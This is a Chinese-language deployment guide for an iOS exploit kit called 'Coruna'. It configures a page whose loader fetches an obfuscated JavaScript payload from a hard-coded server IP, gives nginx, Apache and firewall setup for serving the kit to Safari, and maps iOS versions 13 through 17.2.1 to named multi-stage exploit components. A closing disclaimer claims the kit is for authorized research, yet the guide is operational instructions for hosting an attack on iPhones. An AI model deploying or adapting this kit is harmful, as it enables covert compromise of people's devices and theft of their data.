# Coruna 部署指南

## 服务器地址配置

✅ **已修改为你的服务器地址：** `http://43.98.204.74:8782`

修改位置：`group.html` 第 52-54 行
```javascript
function fqMaGkNg() {
    // 修改为你的服务器地址
    return "http://43.98.204.74:8782/7a7d99099b035b2c6512b6ebeeea6df1ede70fbb.min.js";
}
```

## 部署步骤

### 1. 上传文件到服务器

```bash
# 使用 SCP 上传
scp -r coruna-针对ios17以下老版本/* root@43.98.204.74:/var/www/coruna/

# 或使用 FTP/SFTP 工具上传
```

### 2. 服务器配置

#### Nginx 配置（推荐）

创建配置文件 `/etc/nginx/sites-available/coruna`：

```nginx
server {
    listen 8782;
    server_name 43.98.204.74;

    root /var/www/coruna;
    index group.html;

    # 禁用缓存
    add_header Cache-Control "no-cache, no-store, must-revalidate";
    add_header Pragma "no-cache";
    add_header Expires "0";

    # CORS 支持（如果需要）
    add_header Access-Control-Allow-Origin "*";
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS";
    add_header Access-Control-Allow-Headers "*";

    location / {
        try_files $uri $uri/ =404;
    }

    # 日志
    access_log /var/log/nginx/coruna_access.log;
    error_log /var/log/nginx/coruna_error.log;
}
```

启用站点：
```bash
sudo ln -s /etc/nginx/sites-available/coruna /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```

#### Apache 配置

创建配置文件 `/etc/apache2/sites-available/coruna.conf`：

```apache
<VirtualHost *:8782>
    ServerName 43.98.204.74
    DocumentRoot /var/www/coruna

    <Directory /var/www/coruna>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted

        # 禁用缓存
        Header set Cache-Control "no-cache, no-store, must-revalidate"
        Header set Pragma "no-cache"
        Header set Expires "0"
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/coruna_error.log
    CustomLog ${APACHE_LOG_DIR}/coruna_access.log combined
</VirtualHost>
```

启用站点：
```bash
sudo a2ensite coruna
sudo systemctl reload apache2
```

### 3. 防火墙配置

```bash
# 开放 8782 端口
sudo firewall-cmd --permanent --add-port=8782/tcp
sudo firewall-cmd --reload

# 或使用 iptables
sudo iptables -A INPUT -p tcp --dport 8782 -j ACCEPT
sudo iptables-save
```

### 4. 文件权限设置

```bash
sudo chown -R www-data:www-data /var/www/coruna
sudo chmod -R 755 /var/www/coruna
sudo chmod -R 644 /var/www/coruna/*.js
sudo chmod -R 644 /var/www/coruna/*.html
```

### 5. 测试部署

```bash
# 本地测试
curl http://localhost:8782/group.html

# 或在浏览器中访问
# http://localhost:8782/group.html
```

## 访问方式

### iOS 设备访问

在 iOS Safari 浏览器中访问：
```
http://localhost:8782/group.html  # 本地开发
# 生产环境改为实际服务器地址
```

**⚠️ 重要提示：**
- iOS Safari 要求 HTTPS 才能加载 WASM 模块
- HTTP 可能导致某些功能无法正常工作
- 建议配置 HTTPS 证书

### HTTPS 配置（推荐）

使用 Let's Encrypt 免费证书：

```bash
# 安装 certbot
sudo apt-get install certbot python3-certbot-nginx

# 获取证书
sudo certbot --nginx -d your-domain.com

# 或手动配置
sudo certbot certonly --standalone -d your-domain.com
```

修改 Nginx 配置支持 HTTPS：

```nginx
server {
    listen 443 ssl http2;
    server_name your-domain.com;

    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;

    # SSL 配置
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;

    root /var/www/coruna;
    index group.html;

    # ... 其他配置保持不变
}

# HTTP 重定向到 HTTPS
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}
```

## 安全建议

### 1. 访问控制

```nginx
# IP 白名单
allow 192.168.1.0/24;
allow 10.0.0.0/8;
deny all;

# 或密码保护
auth_basic "Restricted Area";
auth_basic_user_file /etc/nginx/.htpasswd;
```

创建密码文件：
```bash
sudo htpasswd -c /etc/nginx/.htpasswd admin
```

### 2. 日志监控

```bash
# 实时监控访问日志
tail -f /var/log/nginx/coruna_access.log

# 监控错误日志
tail -f /var/log/nginx/coruna_error.log
```

### 3. 定期备份

```bash
# 创建备份脚本
cat > /usr/local/bin/backup-coruna.sh << 'EOF'
#!/bin/bash
DATE=$(date +%Y%m%d_%H%M%S)
tar -czf /backup/coruna_$DATE.tar.gz /var/www/coruna
find /backup -name "coruna_*.tar.gz" -mtime +7 -delete
EOF

chmod +x /usr/local/bin/backup-coruna.sh

# 添加到 crontab（每天凌晨 2 点备份）
echo "0 2 * * * /usr/local/bin/backup-coruna.sh" | crontab -
```

## 故障排查

### 问题 1：无法访问页面

```bash
# 检查 Nginx 状态
sudo systemctl status nginx

# 检查端口是否监听
sudo netstat -tlnp | grep 8782

# 检查防火墙
sudo firewall-cmd --list-ports
```

### 问题 2：文件权限问题

```bash
# 检查文件权限
ls -la /var/www/coruna

# 修复权限
sudo chown -R www-data:www-data /var/www/coruna
sudo chmod -R 755 /var/www/coruna
```

### 问题 3：iOS Safari 无法加载 WASM

- 确保使用 HTTPS
- 检查 CORS 配置
- 查看浏览器控制台错误信息

## 支持的 iOS 版本

| iOS 版本 | Stage 1 | Stage 2 | Stage 3 |
|---------|---------|---------|---------|
| 13.0-14.x | buffout | breezy | VariantA/B |
| 15.0-15.1.1 | buffout | breezy15 | VariantA/B |
| 15.2-15.5 | jacurutu | breezy15 | VariantB |
| 15.6-16.1.2 | bluebird | breezy15 | VariantB |
| 16.2-16.5.1 | terrorbird | seedbell | VariantB |
| 16.3-16.5.1 | terrorbird | seedbell | VariantB |
| 16.6-16.7.12 | cassowary | seedbell | VariantB |
| 17.0-17.2.1 | cassowary | seedbell_pre + seedbell_17 | VariantB |

## 免责声明

⚠️ **此工具仅用于授权的安全研究和教育目的。**

- 未经授权使用可能违反法律
- 请确保在合法的环境中使用
- 作者不对任何滥用行为负责
- 使用前请获得明确的书面授权

## 联系方式

如有问题或需要技术支持，请联系：
- 服务器地址：http://localhost:8782（本地开发）/ 生产服务器地址（部署时修改）
- 管理员：[你的联系方式]

---

**最后更新：** 2026-06-22
**版本：** 1.0